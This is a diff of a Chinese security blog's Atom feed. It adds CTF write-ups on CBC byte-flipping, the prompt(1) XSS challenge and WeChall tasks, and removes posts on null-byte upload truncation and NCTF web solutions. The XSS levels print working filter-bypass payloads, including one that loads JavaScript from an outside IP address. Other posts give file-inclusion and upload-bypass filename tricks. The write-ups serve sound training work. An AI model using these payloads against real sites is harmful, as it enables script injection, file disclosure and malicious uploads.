@@ -1,4 +1,119 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-31T16:52:19+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">hackburger writeup</title><link href="http://localhost:4000/2018/08/31/hackburger/" rel="alternate" type="text/html" title="hackburger writeup" /><published>2018-08-31T00:00:00+08:00</published><updated>2018-08-31T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/31/hackburger</id><content type="html" xml:base="http://localhost:4000/2018/08/31/hackburger/">&lt;p&gt;全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-09-19T18:35:30+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">CBC字节翻转攻击</title><link href="http://localhost:4000/2018/09/19/CBC/" rel="alternate" type="text/html" title="CBC字节翻转攻击" /><published>2018-09-19T00:00:00+08:00</published><updated>2018-09-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/09/19/CBC</id><content type="html" xml:base="http://localhost:4000/2018/09/19/CBC/">&lt;p&gt;最近做到了一道 CBC 字节翻转攻击的题目，这里单独拿出来分析一下，感觉这个攻击还挺有意思的。&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;0x01-题目&quot;&gt;0x01 题目&lt;/h2&gt;
+
+&lt;p&gt;题目:&lt;a href=&quot;http://ctf.bugku.com/challenges#login4&quot;&gt;http://ctf.bugku.com/challenges#login4&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;关于&lt;code class=&quot;highlighter-rouge&quot;&gt;CBC字节翻转攻击&lt;/code&gt;乌云知识库上有一篇特别好的文章:&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;CBC字节翻转攻击:&lt;/strong&gt;&lt;a href=&quot;http://drops.xmd5.com/static/drops/tips-7828.html&quot;&gt;CBC字节翻转攻击-101Approach&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;关于上面这道题目的解法主要参考这篇文章:&lt;a href=&quot;https://rhythmmark.github.io/bugku-web-login4-WP/&quot;&gt;https://rhythmmark.github.io/bugku-web-login4-WP/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;0x02-tips&quot;&gt;0x02 tips&lt;/h2&gt;</content><author><name>Catcher</name></author><category term="CBC" /><summary type="html">最近做到了一道 CBC 字节翻转攻击的题目，这里单独拿出来分析一下，感觉这个攻击还挺有意思的。</summary></entry><entry><title type="html">prompt(1) to win</title><link href="http://localhost:4000/2018/09/18/prompt/" rel="alternate" type="text/html" title="prompt(1) to win" /><published>2018-09-18T00:00:00+08:00</published><updated>2018-09-18T00:00:00+08:00</updated><id>http://localhost:4000/2018/09/18/prompt</id><content type="html" xml:base="http://localhost:4000/2018/09/18/prompt/">&lt;p&gt;xss 的在线练习，挺不错的，整个在线网站看起来也很可以。&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;p&gt;&lt;strong&gt;思考一题多解，以及最优解。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;规则&quot;&gt;规则&lt;/h3&gt;
+&lt;p&gt;1、成功执行prompt(1).&lt;br /&gt;
+2、payload不需要用户交互（成功会显示you won）&lt;br /&gt;
+3、payload必须对下述浏览器有效：&lt;br /&gt;
+Chrome(最新版) - Firefox(最新版) - IE10 及以上版本(或者IE10兼容模式)&lt;br /&gt;
+4、每个级别至少给出两种浏览器的答案&lt;br /&gt;
+5、字符越少越好&lt;/p&gt;
+
+&lt;h3 id=&quot;level-0&quot;&gt;Level 0&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;&amp;lt;&quot;
+
+&quot;&amp;gt;&amp;lt;noembed&amp;gt;&amp;lt;!--&amp;lt;/noembed&amp;gt;&amp;lt;img src=1 onerror=prompt(1)&amp;gt;--&amp;gt;&amp;lt;&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;level-1&quot;&gt;Level 1&lt;/h3&gt;
+
+&lt;p&gt;这里进行了一点过滤&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// Ext.util.Format.stripTags
+var stripTagsRE = /&amp;lt;\/?[^&amp;gt;]+&amp;gt;/gi;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg onload=prompt(1) 
+
+&amp;lt;img src=&quot;&quot; onerror=prompt(1) 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;后面要有一个空格
+因为 html 会进行自动闭合&lt;/p&gt;
+
+&lt;p&gt;关于 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;svg&amp;gt;&lt;/code&gt;参考&lt;a href=&quot;https://www.cnblogs.com/hupeng/archive/2012/12/21/2828456.html&quot;&gt;这篇&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;level-2&quot;&gt;Level 2&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//                      v-- frowny face
+input = input.replace(/[=(]/g, '');
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;prompt&amp;amp;#40;1)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;由源代码可知，这里过滤了&lt;code class=&quot;highlighter-rouge&quot;&gt;=(&lt;/code&gt;，所以这里我们只要使用&lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt;的字符实体就行了，但是千万要注意这里前面需要加&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;svg&amp;gt;&lt;/code&gt;,因为只有这样才能保证&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;#40;&lt;/code&gt;可以被提前解析成 &lt;code class=&quot;highlighter-rouge&quot;&gt;(&lt;/code&gt; 然后与 &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;结合，构成可执行的代码。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;这里的svg不能去掉，由于xml编码特性。在SVG向量里面的script元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;amp;#x28（十六进制）或者&amp;amp;#40（十进制）或者&amp;amp;lpar；（html实体编码）会被还原成（。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;level-3&quot;&gt;Level 3&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;--!&amp;gt;&amp;lt;script&amp;gt;prompt(1)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;源码中显示到 &lt;code class=&quot;highlighter-rouge&quot;&gt;-&amp;gt;&lt;/code&gt; 被过滤，但是这题需要先闭合注释框，2012年后，html标签可以用 &lt;code class=&quot;highlighter-rouge&quot;&gt;--!&amp;gt;&lt;/code&gt;闭合.&lt;/p&gt;
+
+&lt;h3 id=&quot;level-4&quot;&gt;Level 4&lt;/h3&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/^&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;(?:&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;)?\/\/&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;ml&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'script'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;outerHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;这题需要绕过限制访问其他域里的 &lt;code class=&quot;highlighter-rouge&quot;&gt;js&lt;/code&gt; 文件，&lt;code class=&quot;highlighter-rouge&quot;&gt;decodeURIComponent()&lt;/code&gt; 这个函数可对&lt;code class=&quot;highlighter-rouge&quot;&gt;encodeURIComponent()&lt;/code&gt; 函数编码的 URI 进行解码，这里可以使用形如 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://prompt.ml%2f@attacker.com&lt;/code&gt; 的链接骗过浏览器，比如 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://baidu.com%2f@pwdme.cc/&lt;/code&gt; 就可以访问 &lt;code class=&quot;highlighter-rouge&quot;&gt;pwdme.cc&lt;/code&gt;，再用 &lt;code class=&quot;highlighter-rouge&quot;&gt;encodeURIComponent()&lt;/code&gt; 编码后的 &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; 拼接在链接中就可以执行代码，最终的payload为 &lt;code class=&quot;highlighter-rouge&quot;&gt;//prompt.ml%2f@pwdme.cc/1.js&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;这里我的payload是：&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//prompt.ml%2f@47.104.137.146/level4.js
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;直接将上述地址复制到浏览器的地址栏会得到js代码，但还是不行，我们来看看参考答案的解释&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;While the first part of the solution for this level is easy to find, using protocol relative URLs and incomplete HTTP Basic Authentication, &lt;strong&gt;the Unicode trick was the hard part.&lt;/strong&gt; As can be seen, the ways how browsers treat Unicode in URLs and especially domains is quirky and offers a large playground for attacks and obfuscation.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;来自：&lt;a href=&quot;https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-1&quot;&gt;prompt.ml&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;还是没有明白我这里到底哪里不行&lt;/strong&gt;，按道理说我是绕过了的，但是就是没有回显&lt;code class=&quot;highlighter-rouge&quot;&gt;Win&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;参考：&lt;br /&gt;
+&lt;a href=&quot;http://pwdme.cc/2016/12/06/prompt-ml-xss/&quot;&gt;http://pwdme.cc/2016/12/06/prompt-ml-xss/&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://hellohxk.com/blog/prompt-1-writeup/&quot;&gt;https://hellohxk.com/blog/prompt-1-writeup/&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;参考&quot;&gt;参考&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lorexxar.cn/2015/07/02/xss-p/&quot;&gt;https://lorexxar.cn/2015/07/02/xss-p/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml&quot;&gt;https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_35078631/article/details/77073233&quot;&gt;https://blog.csdn.net/qq_35078631/article/details/77073233&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="xss" /><summary type="html">xss 的在线练习，挺不错的，整个在线网站看起来也很可以。</summary></entry><entry><title type="html">hackburger writeup</title><link href="http://localhost:4000/2018/08/31/hackburger/" rel="alternate" type="text/html" title="hackburger writeup" /><published>2018-08-31T00:00:00+08:00</published><updated>2018-08-31T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/31/hackburger</id><content type="html" xml:base="http://localhost:4000/2018/08/31/hackburger/">&lt;p&gt;全是 Web 安全的题目，很有意思而且还有一点难度，在这里记录一下题目的 writeup， 持续更新……&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -1968,7 +2083,24 @@ bitwarrior,LameStartup,HiddenIsConfig,RepeatingHistory,AndIknowchown,OhRightTheP
 
 &lt;p&gt;第一部分在   repeating 文件夹下&lt;/p&gt;
 
-&lt;p&gt;第二部分 在 history 文件夹下，查找 install.php 的历史记录找到正确的 solution&lt;/p&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……</summary></entry><entry><title type="html">NCTF 综合题2</title><link href="http://localhost:4000/2018/08/19/nctfzh2/" rel="alternate" type="text/html" title="NCTF 综合题2" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/nctfzh2</id><content type="html" xml:base="http://localhost:4000/2018/08/19/nctfzh2/">&lt;p&gt;nctf 上的一道题目，需要挺多技巧的，感觉不错，所以单独拿出来分析一下。
+&lt;p&gt;第二部分 在 history 文件夹下，查找 install.php 的历史记录找到正确的 solution&lt;/p&gt;
+
+&lt;h2 id=&quot;30php-my-admin&quot;&gt;30.PHP My Admin&lt;/h2&gt;
+
+&lt;p&gt;这道题要看下讨论区里面给的一些提示&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;网上查一下一般PHPMyAdmin会放在哪个路径下。会发现&lt;code class=&quot;highlighter-rouge&quot;&gt; http://www.wechall.net/phpmyadmin&lt;/code&gt; 最多，另外 &lt;code class=&quot;highlighter-rouge&quot;&gt;http://www.wechall.net/pma&lt;/code&gt;也是有人用的，因为通常就把PHPMyAdmin简称为pma。&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pma.wechall.net/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;31training-caterpillar&quot;&gt;31.Training: Caterpillar&lt;/h2&gt;
+
+&lt;h2 id=&quot;32auth-me&quot;&gt;32.AUTH me&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;tips:&lt;/strong&gt;到&lt;code class=&quot;highlighter-rouge&quot;&gt;find_me&lt;/code&gt;路径下找到 &lt;code class=&quot;highlighter-rouge&quot;&gt;p12&lt;/code&gt;证书，然后火狐浏览器中&lt;code class=&quot;highlighter-rouge&quot;&gt;你的证书&lt;/code&gt;中导入该证书即可，后面要求输入密码，密码为空。&lt;/p&gt;
+
+&lt;h2 id=&quot;33&quot;&gt;33.&lt;/h2&gt;</content><author><name>Catcher</name></author><category term="CTF" /><summary type="html">国外的一个 CTF 网站，挺多人做这个的，这篇就记录 wechall 上题目的 writeup，持续更新……</summary></entry><entry><title type="html">NCTF 综合题2</title><link href="http://localhost:4000/2018/08/19/nctfzh2/" rel="alternate" type="text/html" title="NCTF 综合题2" /><published>2018-08-19T00:00:00+08:00</published><updated>2018-08-19T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/19/nctfzh2</id><content type="html" xml:base="http://localhost:4000/2018/08/19/nctfzh2/">&lt;p&gt;nctf 上的一道题目，需要挺多技巧的，感觉不错，所以单独拿出来分析一下。
 &lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;step1-不断尝试&quot;&gt;step1 不断尝试&lt;/h2&gt;
@@ -2619,318 +2751,4 @@ targte OS: Win2003 Service Pack 2&lt;br /&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap/wiki/Usage&quot;&gt;sqlmap document&lt;/a&gt;&lt;br /&gt;
 &lt;a href=&quot;http://www.vuln.cn/1992&quot;&gt;http://www.vuln.cn/1992&lt;/a&gt;&lt;br /&gt;
-乌云知识库还有几篇不错的文章&lt;/p&gt;</content><author><name>Catcher</name></author><category term="sqlmap" /><summary type="html">抛开场景来谈应用都是在瞎扯，在这里我就打算记录一下各个场景下 sqlmap 的使用。</summary></entry><entry><title type="html">00截断上传</title><link href="http://localhost:4000/2018/08/17/jd00/" rel="alternate" type="text/html" title="00截断上传" /><published>2018-08-17T00:00:00+08:00</published><updated>2018-08-17T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/17/jd00</id><content type="html" xml:base="http://localhost:4000/2018/08/17/jd00/">&lt;p&gt;这里主要总结和分析一下&lt;code class=&quot;highlighter-rouge&quot;&gt;00截断&lt;/code&gt;的原理以及一些利用的场景，后续可能还会补充点。&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h2 id=&quot;0x01-截断原理&quot;&gt;0x01 截断原理&lt;/h2&gt;
-
-&lt;p&gt;截断主要用于文件上传，不管什么样的截断其本质都是一样的，就是为了让程序忽略截断符后面的内容，只取截断符前面的内容。截断符有&lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;%00&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;/00&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;截断的核心，就是 chr(0) 这个字符，当程序在输出含有 chr(0) 变量时，误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-例子&quot;&gt;0x02 例子&lt;/h2&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-asp&quot;&gt;&amp;lt;%  
-path=&quot;upfiles/picture/&quot;
-file=&quot;XXX.jpg&quot;  
-upfilename=path &amp;amp; file '最后的上传地址  
-%&amp;gt;  
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;path 为上传的路径，file 是生成的文件名，而 upfilename 则是最终上传后路径，如果 path 是用户可以控制的，那么就可以截断。更改path为 &lt;code class=&quot;highlighter-rouge&quot;&gt;upfiles/picture/1.aspchr(0)&amp;amp;XXX.jpg&lt;/code&gt;，chr(0) 后面的东西会被忽略。这样我们就上传文件成功了。&lt;/p&gt;
-
-&lt;p&gt;这里还有一道 CTF 的题目:&lt;br /&gt;
-&lt;a href=&quot;https://pengyang.me/2018/08/16/nctf/#21%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87&quot;&gt;nctf一道截断上传题目&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;0x03-总结&quot;&gt;0x03 总结&lt;/h2&gt;
-
-&lt;h3 id=&quot;1-利用文件名及文件类型名类漏洞&quot;&gt;1 利用文件名及文件类型名类漏洞&lt;/h3&gt;
-
-&lt;p&gt;1.1  javascript 检测扩展名绕过漏洞&lt;br /&gt;
-通过js代码检测文件文件类型  —&amp;gt; 利用浏览器修改脚本，破坏检测即可&lt;/p&gt;
-
-&lt;p&gt;1.2 0x00 特殊字符截断漏洞&lt;br /&gt;
-在 C 语言、PHP 等语言中，0x00 被认为是终止符，可构造文件名为 &lt;code class=&quot;highlighter-rouge&quot;&gt;xxx.php[\0].jpg&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;[\0]&lt;/code&gt; 为 16 进制的 0x00 字符，由于&lt;code class=&quot;highlighter-rouge&quot;&gt;[\0](0x00)&lt;/code&gt; 是截断字符，文件名会变成 xxx.php&lt;/p&gt;
-
-&lt;p&gt;1.3 IIS 和 Windows 系统下的 “;” 截断字符露洞&lt;br /&gt;
-在 IIS 和 Windows 环境下，截断字符 “;” 与 0x00 类似。可构造 &lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.asp;bbb.jpg&lt;/code&gt;。IIS 6 将执行&lt;code class=&quot;highlighter-rouge&quot;&gt;aaa.asp&lt;/code&gt;。&lt;/p&gt;
-
-&lt;p&gt;1.4 FCKEditor 为典型的黑名单式文件检测漏洞&lt;/p&gt;
-
-&lt;h3 id=&quot;2-利用文件内容类漏洞&quot;&gt;2 利用文件内容类漏洞&lt;/h3&gt;
-
-&lt;p&gt;2.1 文件头检测漏洞&lt;/p&gt;
-
-&lt;h3 id=&quot;3-利用系统漏洞&quot;&gt;3 利用系统漏洞&lt;/h3&gt;
-
-&lt;p&gt;3.1  Apache 从后往前解析特性&lt;br /&gt;
-Apache 1.x、2.x 中对文件解析有如下特性：&lt;br /&gt;
-(1) 从后往前解析，直至一个可识别文件类型为止；&lt;br /&gt;
-(2) 可识别类型定义在 mime.types 文件中。&lt;br /&gt;
-可构造&lt;code class=&quot;highlighter-rouge&quot;&gt;xxx.php.rar&lt;/code&gt;来绕过。&lt;/p&gt;
-
-&lt;p&gt;3.2  IIS 6 文件夹拓展名漏洞&lt;br /&gt;
-IIS 6 曾经出过的漏洞，处理文件父文件夹如为&lt;code class=&quot;highlighter-rouge&quot;&gt;*.asp&lt;/code&gt;，则本文件按 ASP 格式解析。例如: &lt;code class=&quot;highlighter-rouge&quot;&gt;****/aaa.asp/bbb.jpg，bbb.jpg&lt;/code&gt; 将按 asp 文件解析。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x04-参考&quot;&gt;0x04 参考&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/hack0ne/p/4603144.html&quot;&gt;https://www.cnblogs.com/hack0ne/p/4603144.html&lt;/a&gt;&lt;br /&gt;
-&lt;a href=&quot;https://www.jianshu.com/p/d6c004e2f963&quot;&gt;https://www.jianshu.com/p/d6c004e2f963&lt;/a&gt;&lt;/p&gt;</content><author><name>Catcher</name></author><category term="漏洞研究" /><summary type="html">这里主要总结和分析一下00截断的原理以及一些利用的场景，后续可能还会补充点。</summary></entry><entry><title type="html">NCTF writeup(Web)</title><link href="http://localhost:4000/2018/08/16/nctf_web/" rel="alternate" type="text/html" title="NCTF writeup(Web)" /><published>2018-08-16T00:00:00+08:00</published><updated>2018-08-16T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/16/nctf_web</id><content type="html" xml:base="http://localhost:4000/2018/08/16/nctf_web/">&lt;p&gt;这篇是南邮 CTF web 题目的 writeup，写在这里作为记录。持续更新……&lt;/p&gt;
-
-&lt;!--more--&gt;
-
-&lt;h2 id=&quot;1签到题&quot;&gt;1.签到题&lt;/h2&gt;
-
-&lt;p&gt;查看源码(签到题似乎都是从查看源码开始)&lt;/p&gt;
-
-&lt;h2 id=&quot;2md5-collision&quot;&gt;2.md5 collision&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;payload:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/web19/?a=240610708
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;3签到2&quot;&gt;3.签到2&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;tips:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;改 &lt;code class=&quot;highlighter-rouge&quot;&gt;maxlength&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;4这题不是web&quot;&gt;4.这题不是WEB&lt;/h2&gt;
-
-&lt;p&gt;猫腻在图片了&lt;/p&gt;
-
-&lt;h2 id=&quot;5层层递进&quot;&gt;5.层层递进&lt;/h2&gt;
-
-&lt;p&gt;扫目录 get &lt;code class=&quot;highlighter-rouge&quot;&gt;404.html&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;查看源码，源码里面有猫腻，需要仔细才能搞到 flag&lt;/p&gt;
-
-&lt;h2 id=&quot;6aaencode&quot;&gt;6.AAencode&lt;/h2&gt;
-
-&lt;p&gt;下载下来直接拿去解密就好了&lt;/p&gt;
-
-&lt;h2 id=&quot;7单身二十年&quot;&gt;7.单身二十年&lt;/h2&gt;
-
-&lt;p&gt;burpsuite 抓包(对于这种有链接跳转的，基本都要用 burp 抓包)&lt;/p&gt;
-
-&lt;h2 id=&quot;8php-decode&quot;&gt;8.php decode&lt;/h2&gt;
-
-&lt;p&gt;代码运行一下，&lt;code class=&quot;highlighter-rouge&quot;&gt;return&lt;/code&gt; -&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;echo&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;9文件包含&quot;&gt;9.文件包含&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;payload&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?file=php://filter/convert.base64-encode/resource=index.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;10单身一百年也没用&quot;&gt;10.单身一百年也没用&lt;/h2&gt;
-
-&lt;p&gt;burpsuite 抓包&lt;/p&gt;
-
-&lt;h2 id=&quot;11download&quot;&gt;11.Download~!&lt;/h2&gt;
-
-&lt;font color=&quot;red&quot;&gt;貌似是题目坏掉了，题目无法访问&lt;/font&gt;
-
-&lt;h2 id=&quot;12cookie&quot;&gt;12.COOKIE&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;tips:&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;改下 cookie&lt;/p&gt;
-
-&lt;h2 id=&quot;13mysql&quot;&gt;13.MYSQL&lt;/h2&gt;
-
-&lt;p&gt;intval函数向下取整，1024.1&lt;/p&gt;
-
